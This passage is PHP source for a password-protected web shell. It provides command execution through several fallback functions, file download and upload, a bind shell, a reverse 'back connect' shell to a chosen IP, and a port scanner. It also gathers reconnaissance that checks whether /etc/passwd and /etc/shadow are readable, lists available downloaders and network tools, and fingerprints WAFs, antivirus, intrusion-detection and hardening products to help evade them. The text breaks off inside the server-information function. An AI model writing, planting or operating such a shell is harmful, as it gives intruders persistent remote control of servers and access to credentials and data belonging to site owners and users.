<?php
session_start();
date_default_timezone_set('Asia/Manila');
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/pv-error_log');
error_reporting(E_ALL);
ini_set('display_errors', 0);
set_time_limit(0);

// --- Removed http_response_code polyfill, as it's native in PHP 5.6+ ---
$default_password_hash = '2ebba5cd75576c408240e57110e7b4ff';
$WHITELISTED_IPS = array();
$WHITELISTED_USER_AGENTS = array();
if (!empty($WHITELISTED_IPS) && !in_array($_SERVER['REMOTE_ADDR'], $WHITELISTED_IPS))
{
    http_response_code(403);
    error_log("Forbidden IP: " . $_SERVER['REMOTE_ADDR']);
    exit("IP Forbidden.");
}
if (!empty($WHITELISTED_USER_AGENTS))
{
    $currentUserAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $uaMatch = false;
    foreach ($WHITELISTED_USER_AGENTS as $ua)
    {
        if (strpos($currentUserAgent, $ua) !== false)
        {
            $uaMatch = true;
            break;
        }
    }
    if (!$uaMatch)
    {
        http_response_code(403);
        error_log("Forbidden User-Agent: " . $currentUserAgent);
        exit("User-Agent Forbidden.");
    }
}
$authenticated = isset($_SESSION['auth']) && $_SESSION['auth'] === true;
$error = "";
if (!isset($_SESSION['terminal_cwd']))
{
    $_SESSION['terminal_cwd'] = getcwd();
}
$fileManagerInitialPath = (isset($_SESSION['filemanager_cwd']) && is_dir($_SESSION['filemanager_cwd'])) ? $_SESSION['filemanager_cwd'] : getcwd();
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['ajax_action']))
{
    if (isset($_POST['password']))
    {
        if (md5($_POST['password']) === $default_password_hash)
        {
            $_SESSION['auth'] = true;
            $authenticated = true;
            $_SESSION['terminal_cwd'] = getcwd();
            $_SESSION['filemanager_cwd'] = getcwd();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        else
        {
            $error = 'Invalid password.';
            error_log("Failed login attempt with password: " . $_POST['password']);
        }
    }
    elseif (isset($_POST['action']) && $_POST['action'] === 'logout')
    {
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}
if ($authenticated && isset($_GET['action_get']))
{
    switch ($_GET['action_get'])
    {
        case 'phpinfo_content':
            phpinfo();
            exit;
        case 'download_file':
            if (isset($_GET['path']))
            {
                $filePath = realpath($_GET['path']);
                if ($filePath && is_file($filePath) && is_readable($filePath))
                {
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($filePath));
                    ob_clean();
                    flush();
                    readfile($filePath);
                    exit;
                }
                else
                {
                    http_response_code(404);
                    error_log("Download failed: File not found or not accessible: " . $_GET['path']);
                    echo "File not found or not accessible: " . htmlspecialchars($_GET['path']);
                    exit;
                }
            }
            else
            {
                http_response_code(400);
                error_log("Download failed: File path not specified.");
                echo "File path not specified.";
                exit;
            }
        break;
    }
}
function is_callable_shell_func($function_name)
{
    if (!function_exists($function_name))
    {
        return false;
    }
    $disabled_functions = @ini_get('disable_functions');
    if ($disabled_functions)
    {
        $disabled_array = array_map('trim', explode(',', $disabled_functions));
        if (in_array($function_name, $disabled_array))
        {
            return false;
        }
    }
    return true;
}
function execute_command_with_fallback($command)
{
    $full_command_redirect = $command . ' 2>&1';
    if (is_callable_shell_func('proc_open'))
    {
        $descriptorspec = array(
            0 => array(
                "pipe",
                "r"
            ) ,
            1 => array(
                "pipe",
                "w"
            ) ,
            2 => array(
                "pipe",
                "w"
            )
        );
        $pipes = array();
        $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
        $process = @proc_open($command, $descriptorspec, $pipes, $cwd);
        if (is_resource($process))
        {
            @fclose($pipes[0]);
            $stdout = @stream_get_contents($pipes[1]);
            $stderr = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($process);
            return $stdout . $stderr;
        }
    }
    if (is_callable_shell_func('popen'))
    {
        $handle = @popen($full_command_redirect, 'r');
        if ($handle)
        {
            $output = '';
            while (!feof($handle))
            {
                $output .= fread($handle, 8192);
            }
            @pclose($handle);
            return $output;
        }
    }
    if (is_callable_shell_func('shell_exec'))
    {
        $output = @shell_exec($full_command_redirect);
        if ($output !== null)
        {
            return $output;
        }
    }
    if (is_callable_shell_func('system'))
    {
        ob_start();
        @system($full_command_redirect, $return_var);
        $output = ob_get_contents();
        ob_end_clean();
        return $output;
    }
    if (is_callable_shell_func('passthru'))
    {
        ob_start();
        @passthru($full_command_redirect, $return_var);
        $output = ob_get_contents();
        ob_end_clean();
        return $output;
    }
    if (is_callable_shell_func('exec'))
    {
        $output_array = array();
        @exec($full_command_redirect, $output_array, $return_var);
        return implode("\n", $output_array);
    }
    return "[Error] All command execution backends (proc_open, popen, shell_exec, system, passthru, exec) are disabled or failed.";
}
function stream_command($command)
{
    if (function_exists('apache_setenv'))
    {
        @apache_setenv('no-gzip', 1);
    }
    @ini_set('zlib.output_compression', 0);
    @ini_set('implicit_flush', 1);
    @ob_end_clean();
    ob_implicit_flush(1);
    header('Content-Type: text/plain; charset=utf-8');
    header('X-Content-Type-Options: nosniff');
    if (is_callable_shell_func('proc_open'))
    {
        $descriptorspec = array(
            0 => array(
                "pipe",
                "r"
            ) ,
            1 => array(
                "pipe",
                "w"
            ) ,
            2 => array(
                "pipe",
                "w"
            )
        );
        $pipes = array();
        $process = @proc_open($command, $descriptorspec, $pipes, $_SESSION['terminal_cwd']);
        if (is_resource($process))
        {
            $status = proc_get_status($process);
            if ($status && isset($status['pid']))
            {
                $_SESSION['running_process_pid'] = $status['pid'];
            }
            session_write_close();
            fclose($pipes[0]);
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            while (true)
            {
                $status = proc_get_status($process);
                if (!$status['running'])
                {
                    break;
                }
                $stdout = stream_get_contents($pipes[1]);
                if ($stdout !== false && $stdout !== '')
                {
                    echo $stdout;
                    flush();
                }
                $stderr = stream_get_contents($pipes[2]);
                if ($stderr !== false && $stderr !== '')
                {
                    echo $stderr;
                    flush();
                }
                usleep(50000);
            }
            $stdout = stream_get_contents($pipes[1]);
            if ($stdout)
            {
                echo $stdout;
                flush();
            }
            $stderr = stream_get_contents($pipes[2]);
            if ($stderr)
            {
                echo $stderr;
                flush();
            }
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            return;
        }
    }
    if (is_callable_shell_func('popen'))
    {
        $handle = @popen($command . ' 2>&1', 'r');
        if ($handle)
        {
            while (!feof($handle))
            {
                $buffer = fread($handle, 4096);
                echo $buffer;
                flush();
            }
            @pclose($handle);
            return;
        }
    }
    echo execute_command_with_fallback($command);
    flush();
}
function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $target_dir)
{
    $temp_upload_dir = rtrim(sys_get_temp_dir() , DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'pv-shell-uploads';
    $chunk_dir = $temp_upload_dir . DIRECTORY_SEPARATOR . $upload_id;
    $final_path = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $original_filename;
    if (!is_writable($target_dir)) return "Target directory not writable: " . htmlspecialchars($target_dir);
    $out_handle = @fopen($final_path, 'wb');
    if (!$out_handle) return "Cannot open target file for writing: " . htmlspecialchars($final_path);
    for ($i = 0;$i < $total_chunks;$i++)
    {
        $chunk_path = $chunk_dir . DIRECTORY_SEPARATOR . $i;
        if (!file_exists($chunk_path))
        {
            fclose($out_handle);
            @unlink($final_path);
            return "Reassembly failed: Missing chunk #" . $i;
        }
        $in_handle = @fopen($chunk_path, 'rb');
        if (!$in_handle)
        {
            fclose($out_handle);
            @unlink($final_path);
            return "Reassembly failed: Cannot read chunk #" . $i;
        }
        stream_copy_to_stream($in_handle, $out_handle);
        fclose($in_handle);
        @unlink($chunk_path);
    }
    fclose($out_handle);
    @rmdir($chunk_dir);
    return true;
}
function command_exists($command)
{
    if (!is_callable_shell_func('shell_exec'))
    {
        return false;
    }
    $safe_command = escapeshellarg($command);
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
    {
        $result = @shell_exec("where " . $command . " 2> NUL");
        return !empty($result);
    }
    else
    {
        $result = @shell_exec("command -v " . $safe_command . " 2>/dev/null");
        return !empty($result);
    }
}
function network_start_port_bind($port, $password)
{
    $output_buffer = "Attempting to bind to port $port...\n";
    $address = "0.0.0.0";
    $server = @stream_socket_server("tcp://$address:$port", $errno, $errstr);
    if (!$server)
    {
        $output_buffer .= "❌ Error binding to port $port: $errstr ($errno)\n";
        error_log("Network Bind Error: $errstr ($errno) for port $port");
        return $output_buffer;
    }
    $output_buffer .= "🟢 Bound to port $port. Waiting for connection (timeout 60s)...\n";
    $client = @stream_socket_accept($server, 60);
    if ($client)
    {
        $client_ip_port = stream_socket_get_name($client, true);
        $output_buffer .= "Client connected from {$client_ip_port}.\n";
        @fwrite($client, "Password: ");
        stream_set_blocking($client, false);
        $recv_pass = '';
        $start_time = time();
        while (true)
        {
            $char = @fgets($client, 2);
            if ($char !== false && $char !== '')
            {
                if (strpos($char, "\n") !== false || strpos($char, "\r") !== false) break;
                $recv_pass .= $char;
            }
            if (time() - $start_time > 10)
            {
                $output_buffer .= "Password input timed out.\n";
                break;
            }
            if (connection_aborted())
            {
                $output_buffer .= "Client disconnected during password input.\n";
                @fclose($client);
                @fclose($server);
                return $output_buffer;
            }
            usleep(100000);
        }
        stream_set_blocking($client, true);
        $recv_pass = trim($recv_pass);
        if ($recv_pass === $password)
        {
            $output_buffer .= "Authenticated successfully for {$client_ip_port}.\n";
            @fwrite($client, "Authenticated. Shell access granted.\n");
            $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
            $shell_cmd = $is_windows ? 'cmd.exe' : '/bin/sh -i';
            if (function_exists('proc_open'))
            {
                $descriptorspec = array(
                    0 => array(
                        "pipe",
                        "r"
                    ) ,
                    1 => array(
                        "pipe",
                        "w"
                    ) ,
                    2 => array(
                        "pipe",
                        "w"
                    )
                );
                $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
                $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $cwd);
                if (is_resource($process))
                {
                    stream_set_blocking($pipes[0], 0);
                    stream_set_blocking($pipes[1], 0);
                    stream_set_blocking($pipes[2], 0);
                    stream_set_blocking($client, 0);
                    $prompt_cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
                    $initial_prompt = ($is_windows ? '' : "Shell process started.\n") . ($is_windows ? ($prompt_cwd . "> ") : ($prompt_cwd . "$ "));
                    @fwrite($client, $initial_prompt);
                    if ($is_windows)
                    {
                        @fwrite($pipes[0], "\r\n");
                    }
                    while (true)
                    {
                        if (feof($client) || !is_resource($process) || !proc_get_status($process) ['running'] || connection_aborted()) break;
                        $read_sockets = array(
                            $client,
                            $pipes[1],
                            $pipes[2]
                        );
                        $write_sockets = NULL;
                        $except_sockets = NULL;
                        if (false === ($num_changed_sockets = @stream_select($read_sockets, $write_sockets, $except_sockets, 0, 200000)))
                        {
                            error_log("Bind Shell: stream_select error.");
                            $output_buffer .= "stream_select error.\n";
                            break;
                        }
                        if ($num_changed_sockets > 0)
                        {
                            foreach ($read_sockets as $socket_s)
                            {
                                if ($socket_s == $client)
                                {
                                    $input = @fread($client, 4096);
                                    if ($input === false || $input === '')
                                    {
                                        proc_terminate($process);
                                        break 2;
                                    }
                                    @fwrite($pipes[0], $input);
                                }
                                elseif ($socket_s == $pipes[1])
                                {
                                    $output_shell = @fread($pipes[1], 4096);
                                    if ($output_shell !== false && $output_shell !== '') @fwrite($client, $output_shell);
                                }
                                elseif ($socket_s == $pipes[2])
                                {
                                    $output_shell = @fread($pipes[2], 4096);
                                    if ($output_shell !== false && $output_shell !== '') @fwrite($client, "STDERR: " . $output_shell);
                                }
                            }
                        }
                    }
                    @fclose($pipes[0]);
                    @fclose($pipes[1]);
                    @fclose($pipes[2]);
                    @proc_close($process);
                    $output_buffer .= "Shell process terminated.\n";
                }
                else
                {
                    $output_buffer .= "Failed to open shell process using proc_open.\n";
                    @fwrite($client, "Failed to open shell process.\n");
                    error_log("Bind Shell: proc_open failed.");
                }
            }
            else
            {
                $output_buffer .= "proc_open is not available. Interactive shell disabled for bind.\n";
                @fwrite($client, "proc_open is not available. Limited interaction.\n");
            }
        }
        else
        {
            $output_buffer .= "Access denied for {$client_ip_port} (Password: " . htmlspecialchars($recv_pass) . ").\n";
            @fwrite($client, "Access denied.\n");
        }
        @fclose($client);
        $output_buffer .= "Client disconnected.\n";
    }
    else
    {
        $output_buffer .= "No client connected or timed out.\n";
    }
    @fclose($server);
    $output_buffer .= "Port binding listener closed.\n";
    return $output_buffer;
}
function network_start_back_connect($ip, $port)
{
    $output_buffer = "Attempting to connect back to {$ip}:{$port}...\n";
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock)
    {
        $output_buffer .= "❌ Connection failed: $errstr ($errno)\n";
        error_log("Back Connect Error: $errstr ($errno) for {$ip}:{$port}");
        return $output_buffer;
    }
    $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '[server]';
    $output_buffer .= "🔌 Connected back successfully to {$ip}:{$port}!\n";
    @fwrite($sock, "Shell connected from " . $server_name . ". PHP Interactive Shell.\n");
    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $shell_cmd = $is_windows ? 'cmd.exe' : '/bin/sh -i';
    if (function_exists('proc_open'))
    {
        $descriptorspec = array(
            0 => array(
                "pipe",
                "r"
            ) ,
            1 => array(
                "pipe",
                "w"
            ) ,
            2 => array(
                "pipe",
                "w"
            )
        );
        $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
        $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $cwd);
        if (is_resource($process))
        {
            stream_set_blocking($pipes[0], 0);
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            stream_set_blocking($sock, 0);
            $prompt_cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
            $initial_prompt = ($is_windows ? '' : "Shell process started.\n") . ($is_windows ? ($prompt_cwd . "> ") : ($prompt_cwd . "$ "));
            @fwrite($sock, $initial_prompt);
            if ($is_windows)
            {
                @fwrite($pipes[0], "\r\n");
            }
            while (true)
            {
                if (feof($sock) || !is_resource($process) || !proc_get_status($process) ['running'] || connection_aborted()) break;
                $read_sockets = array(
                    $sock,
                    $pipes[1],
                    $pipes[2]
                );
                $write_sockets = NULL;
                $except_sockets = NULL;
                if (false === ($num_changed_sockets = @stream_select($read_sockets, $write_sockets, $except_sockets, 0, 200000)))
                {
                    error_log("Back Connect: stream_select error.");
                    $output_buffer .= "stream_select error.\n";
                    break;
                }
                if ($num_changed_sockets > 0)
                {
                    foreach ($read_sockets as $socket_s)
                    {
                        if ($socket_s == $sock)
                        {
                            $input = @fread($sock, 4096);
                            if ($input === false || $input === '')
                            {
                                proc_terminate($process);
                                break 2;
                            }
                            @fwrite($pipes[0], $input);
                        }
                        elseif ($socket_s == $pipes[1])
                        {
                            $output_shell = @fread($pipes[1], 4096);
                            if ($output_shell !== false && $output_shell !== '') @fwrite($sock, $output_shell);
                        }
                        elseif ($socket_s == $pipes[2])
                        {
                            $output_shell = @fread($pipes[2], 4096);
                            if ($output_shell !== false && $output_shell !== '') @fwrite($sock, "STDERR: " . $output_shell);
                        }
                    }
                }
            }
            @fclose($pipes[0]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($process);
            $output_buffer .= "Shell process terminated.\n";
        }
        else
        {
            $output_buffer .= "Failed to open shell process using proc_open.\n";
            @fwrite($sock, "Failed to open shell process.\n");
            error_log("Back Connect: proc_open failed.");
        }
    }
    else
    {
        $output_buffer .= "proc_open is not available. Interactive shell disabled for back-connect.\n";
        @fwrite($sock, "proc_open is not available. Limited interaction.\n");
    }
    @fclose($sock);
    $output_buffer .= "🔌 Back connection closed.\n";
    return $output_buffer;
}
function do_ping($host)
{
    $host_safe = escapeshellarg(trim($host));
    $output = "Ping command not available or OS not supported.";
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
    {
        $output = @shell_exec("ping -n 4 {$host_safe} 2>&1");
    }
    else
    {
        if (command_exists('ping'))
        {
            $output = @shell_exec("ping -c 4 {$host_safe} 2>&1");
        }
    }
    return $output ? $output : "Ping failed or no output.";
}
function do_port_scan($host, $ports)
{
    $host = trim($host);
    if (empty($host)) return "No host provided.";
    $ports_to_scan = array();
    $port_ranges = explode(',', $ports);
    foreach ($port_ranges as $range)
    {
        if (strpos($range, '-') !== false)
        {
            list($start, $end) = explode('-', $range);
            $start = intval($start);
            $end = intval($end);
            if ($start > 0 && $end > 0 && $start <= $end)
            {
                for ($i = $start;$i <= $end;$i++)
                {
                    $ports_to_scan[] = $i;
                }
            }
        }
        else
        {
            $port = intval($range);
            if ($port > 0)
            {
                $ports_to_scan[] = $port;
            }
        }
    }
    $ports_to_scan = array_unique($ports_to_scan);
    sort($ports_to_scan);
    if (empty($ports_to_scan))
    {
        return "No valid ports specified.";
    }
    $output = "Scanning " . htmlspecialchars($host) . ".\n\n";
    foreach ($ports_to_scan as $port)
    {
        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
        if (is_resource($connection))
        {
            $output .= "Port " . $port . " is <span style='color:lime;'>open</span>.\n";
            fclose($connection);
        }
        else
        {
            $output .= "Port " . $port . " is <span style='color:red;'>closed</span>.\n";
        }
    }
    return $output;
}
function do_dns_lookup($host)
{
    $host = trim($host);
    if (empty($host)) return "No host provided.";
    $output = "DNS Lookup for: " . htmlspecialchars($host) . "\n\n";
    $records = @dns_get_record($host, DNS_ALL);
    if ($records === false || empty($records))
    {
        return $output . "Could not retrieve records or host not found.";
    }
    foreach ($records as $r)
    {
        $output .= "Type: {$r['type']}\t";
        if (isset($r['ip'])) $output .= "IP: {$r['ip']}\t";
        if (isset($r['ipv6'])) $output .= "IPv6: {$r['ipv6']}\t";
        if (isset($r['target'])) $output .= "Target: {$r['target']}\t";
        if (isset($r['txt'])) $output .= "TXT: {$r['txt']}\t";
        if (isset($r['pri'])) $output .= "Pri: {$r['pri']}\t";
        if (isset($r['ttl'])) $output .= "TTL: {$r['ttl']}\t";
        $output .= "\n";
    }
    return $output;
}
function generate_breadcrumbs($path)
{
    $breadcrumbs = array();
    $path = rtrim(str_replace('\\', '/', $path) , '/');
    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $current_path_builder = '';
    if ($is_windows)
    {
        if (preg_match('/^([a-zA-Z]:)/', $path, $matches))
        {
            $root_name = $matches[1];
            $current_path_builder = $root_name . '/';
            $breadcrumbs[] = array(
                'name' => $root_name,
                'path' => str_replace('/', DIRECTORY_SEPARATOR, $current_path_builder)
            );
            $path = ltrim(substr($path, strlen($root_name)) , '/');
        }
        else
        {
            return $breadcrumbs;
        }
    }
    else
    {
        $breadcrumbs[] = array(
            'name' => '/',
            'path' => '/'
        );
        $current_path_builder = '/';
        $path = ltrim($path, '/');
    }
    if ($path === '')
    {
        return $breadcrumbs;
    }
    $parts = explode('/', $path);
    foreach ($parts as $part)
    {
        if ($part === '') continue;
        if (substr($current_path_builder, -1) !== '/')
        {
            $current_path_builder .= '/';
        }
        $current_path_builder .= $part;
        $breadcrumbs[] = array(
            'name' => $part,
            'path' => str_replace('/', DIRECTORY_SEPARATOR, $current_path_builder)
        );
    }
    return $breadcrumbs;
}
function getServerInfoDetails()
{
    $info = array();
    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $info['Server Software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A');
    $info['Server Name'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A';
    $info['Server Admin'] = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'N/A';
    $info['Server Port'] = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'N/A';
    $info['PHP Version'] = PHP_VERSION;
    $info['Operating System'] = php_uname();
    $nproc = 'N/A';
    if (!$is_windows)
    {
        if (command_exists('nproc'))
        {
            $nproc_out = trim(@shell_exec('nproc'));
            if (is_numeric($nproc_out)) $nproc = $nproc_out;
        }
        elseif (@is_readable('/proc/cpuinfo'))
        {
            $cpuinfo = @file_get_contents('/proc/cpuinfo');
            if ($cpuinfo)
            {
                $matches = array();
                preg_match_all('/^processor\s*:\s*\d+/m', $cpuinfo, $matches);
                $nproc_count = count($matches[0]);
                $nproc = $nproc_count > 0 ? $nproc_count : 'N/A (parse failed)';
            }
        }
    }
    else
    {
        $nproc_env = getenv('NUMBER_OF_PROCESSORS');
        if ($nproc_env) $nproc = $nproc_env;
    }
    $info['Number of CPUs/Cores'] = $nproc;
    $info['Current User'] = get_current_user();
    if (function_exists('posix_getuid') && function_exists('posix_getpwuid'))
    {
        $UID = posix_getuid();
        $userInfo = posix_getpwuid($UID);
        $info['User Info (posix)'] = ($userInfo ? $userInfo['name'] : 'N/A') . ' (UID: ' . $UID . ', GID: ' . ($userInfo ? $userInfo['gid'] : posix_getgid()) . ')';
    }
    if (!$is_windows)
    {
        $passwd_path = '/etc/passwd';
        $info['Readable /etc/passwd'] = @is_readable($passwd_path) ? '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/passwd\', \'passwd\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>' : '<span style="color:red;">No</span>';
        $shadow_path = '/etc/shadow';
        $info['Readable /etc/shadow'] = @is_readable($shadow_path) ? '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/shadow\', \'shadow\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>' : '<span style="color:red;">No</span>';
    }
    else
    {
        $info['Readable /etc/passwd'] = 'N/A (Linux specific)';
        $info['Readable /etc/shadow'] = 'N/A (Linux specific)';
    }
    $found_downloaders = array();
    $downloader_cmds = array(
        'wget',
        'curl',
        'fetch',
        'lynx',
        'links',
        'aria2c'
    );
    foreach ($downloader_cmds as $cmd)
    {
        if (command_exists($cmd)) $found_downloaders[] = $cmd;
    }
    if (ini_get('allow_url_fopen')) $found_downloaders[] = 'PHP: file_get_contents';
    if (extension_loaded('curl')) $found_downloaders[] = 'PHP: cURL';
    $info['Downloaders'] = !empty($found_downloaders) ? implode(', ', $found_downloaders) : 'None found';
    $found_useful = array();
    $useful_cmds = array(
        'gcc',
        'g++',
        'make',
        'git',
        'svn',
        'htop',
        'iotop',
        'python',
        'perl',
        'ruby',
        'node',
        'java',
        'tar',
        'unzip',
        'zip',
        'gzip',
        'bzip2',
        'locate',
        'nmap',
        'masscan',
        'sqlmap',
        'socat',
        'netcat',
        'nc',
        'docker',
        'kubectl'
    );
    $package_managers = array(
        'apt',
        'yum',
        'apk',
        'pacman',
        'dnf'
    );
    foreach (array_merge($useful_cmds, $package_managers) as $cmd)
    {
        if (command_exists($cmd)) $found_useful[] = $cmd;
    }
    $info['Useful'] = !empty($found_useful) ? implode(', ', $found_useful) : 'None found';
    $danger_detections = array(
        'WAF' => array() ,
        'HIDS/IPS' => array() ,
        'Antivirus' => array() ,
        'Hardening' => array() ,
        'Firewall' => array() ,
        'Log Scanners' => array()
    );
    $add_detection = function ($category, $name) use (&$danger_detections)
    {
        if (!in_array($name, $danger_detections[$category]))
        {
            $danger_detections[$category][] = $name;
        }
    };
    if (extension_loaded('suhosin')) $add_detection('Hardening', 'Suhosin (PHP Extension)');
    if (!$is_windows && is_callable_shell_func('shell_exec'))
    {
        $ps_output = @shell_exec('ps aux');
        $dmesg_output = @shell_exec('dmesg');
        if (command_exists('imunify360-agent'))
        {
            $add_detection('WAF', 'Imunify360 (Agent)');
        }
        elseif (@is_dir('/etc/sysconfig/imunify360') || @is_dir('/var/imunify360'))
        {
            $add_detection('WAF', 'Imunify360 (Config)');
        }
        elseif (($auto_prepend = @ini_get('auto_prepend_file')) && stripos($auto_prepend, 'imunify360') !== false)
        {
            $add_detection('WAF', 'Imunify360 (PHP Hook)');
        }
        elseif ($ps_output && preg_match('/imunify(360)?-(agent|service|sentry)/i', $ps_output))
        {
            $add_detection('WAF', 'Imunify360 (Process)');
        }
        $modsec_detected = false;
        if (function_exists('apache_get_modules') && in_array('mod_security2', apache_get_modules()))
        {
            $add_detection('WAF', 'ModSecurity (Apache Module)');
            $modsec_detected = true;
        }
        elseif (command_exists('httpd') && stripos(@shell_exec('httpd -M 2>/dev/null') , 'security2_module') !== false)
        {
            $add_detection('WAF', 'ModSecurity (Apache Binary)');
            $modsec_detected = true;
        }
        elseif (command_exists('apache2ctl') && stripos(@shell_exec('apache2ctl -M 2>/dev/null') , 'security2_module') !== false)
        {
            $add_detection('WAF', 'ModSecurity (Apache Binary)');
            $modsec_detected = true;
        }
        elseif (command_exists('nginx') && stripos(@shell_exec('nginx -V 2>&1') , 'mod_security') !== false)
        {
            $add_detection('WAF', 'ModSecurity (Nginx Module)');
            $modsec_detected = true;
        }
        if (!$modsec_detected && (@is_dir('/etc/modsecurity') || @is_dir('/etc/nginx/modsec')))
        {
            $add_detection('WAF', 'ModSecurity (Config)');
        }
        if (function_exists('apache_get_modules') && in_array('mod_cwaf', apache_get_modules()))
        {
            $add_detection('WAF', 'Comodo WAF (Apache Module)');
        }
        elseif (@is_dir('/usr/local/cwaf'))
        {
            $add_detection('WAF', 'Comodo WAF (Config)');
        }
        $find_wp_root = function ()
        {
            $path = __DIR__;
            for ($i = 0;$i < 10;$i++)
            {
                if (@is_file($path . '/wp-config.php')) return $path;
                $parent = dirname($path);
                if ($parent === $path || empty($parent)) break;
                $path = $parent;
            }
            return false;
        };
        if (($wp_root = $find_wp_root()))
        {
            if (@is_file($wp_root . '/wordfence-waf.php') || @is_dir($wp_root . '/wp-content/plugins/wordfence/'))
            {
                $add_detection('WAF', 'Wordfence (WordPress)');
            }
            if (@is_dir($wp_root . '/wp-content/plugins/sucuri-scanner/'))
            {
                $add_detection('WAF', 'Sucuri (WordPress)');
            }
        }
        if ($ps_output && preg_match('/(ossec|wazuh)-(agentd|maild|execd|logcollector|remoted|syscheckd|monitord)/i', $ps_output))
        {
            $add_detection('HIDS/IPS', preg_match('/wazuh/i', $ps_output) ? 'Wazuh (Process)' : 'OSSEC (Process)');
        }
        elseif (@is_readable('/var/ossec/etc/ossec.conf'))
        {
            $add_detection('HIDS/IPS', 'OSSEC/Wazuh (Config)');
        }
        if (command_exists('maldet'))
        {
            $add_detection('Antivirus', 'Maldet (LMD)');
        }
        elseif (@is_dir('/usr/local/maldet'))
        {
            $add_detection('Antivirus', 'Maldet (LMD Config)');
        }
        if ($ps_output && preg_match('/(clamd|clamav|freshclam)/i', $ps_output))
        {
            $add_detection('Antivirus', 'ClamAV (Process)');
        }
        if (command_exists('rkhunter') || @is_readable('/etc/rkhunter.conf')) $add_detection('HIDS/IPS', 'RKHunter');
        if (command_exists('chkrootkit') || @is_readable('/etc/chkrootkit.conf')) $add_detection('HIDS/IPS', 'Chkrootkit');
        if ($dmesg_output)
        {
            if (stripos($dmesg_output, 'SELinux') !== false) $add_detection('Hardening', 'SELinux (dmesg)');
            if (stripos($dmesg_output, 'AppArmor') !== false) $add_detection('Hardening', 'AppArmor (dmesg)');
            if (stripos($dmesg_output, 'grsecurity') !== false) $add_detection('Hardening', 'Grsecurity (dmesg)');
        }
        if (!in_array('SELinux (dmesg)', $danger_detections['Hardening']) && command_exists('sestatus') && stripos(@shell_exec('sestatus') , 'enabled') !== false)
        {
            $add_detection('Hardening', 'SELinux (sestatus)');
        }
        $generic_keywords = array(
            'HIDS/IPS' => array(
                'snort',
                'suricata',
                'tripwire',
                'aide',
                'bro',
                'zeek'
            ) ,
            'Firewall' => array(
                'iptables',
                'ufw',
                'firewalld',
                'ipfw',
                'shorewall',
                'portsentry'
            ) ,
            'Log Scanners' => array(
                'fail2ban',
                'denyhosts',
                'logwatch',
                'logcheck'
            ) ,
            'Antivirus' => array(
                'avg',
                'kav',
                'nod32',
                'bdcored',
                'uvscan',
                'sav',
                'drwebd',
                'sophos'
            )
        );
        if ($ps_output)
        {
            foreach ($generic_keywords as $category => $keywords)
            {
                foreach ($keywords as $keyword)
                {
                    if (stripos($ps_output, $keyword) !== false)
                    {
                        $add_detection($category, ucfirst($keyword) . ' (Process)');
                    }
                }
            }
        }
    }
    $danger_strings = array();
    foreach ($danger_detections as $category => $items)
    {
        if (!empty($items))
        {
            $danger_strings[] = "<strong>" . htmlspecialchars($category) . ":</strong> " . htmlspecialchars(implode(', ', array_unique($items)));
        }
    }
    $info['Danger'] = !empty($danger_strings) ? implode('<br>', $danger_strings) : 'None detected';
    $safe_mode_val = ini_get('safe_mode');
    if (is_string($safe_mode_val) && strtolower($safe_mode_val) === "off") $safe_mode_val = 0;
    elseif (is_string($safe_mode_val) && strtolower($safe_mode_val) === "on") $safe_mode_val = 1;
    $info['Safe Mode'] = $safe_mode_val ? '<span style="color:red;">ON</span>' : '<span style="color:lime;">OFF</span>';
    $disabled_functions = ini_get('disable_functions');
    $info['Disabled Functions'] = $disabled_functions ? $disabled_functions : 'None';
    $info['Open Basedir'] = ini_get('open_basedir') ? ini_get('open_basedir') : 'None';
    $info['Memory Limit'] = ini_get('memory_limit');
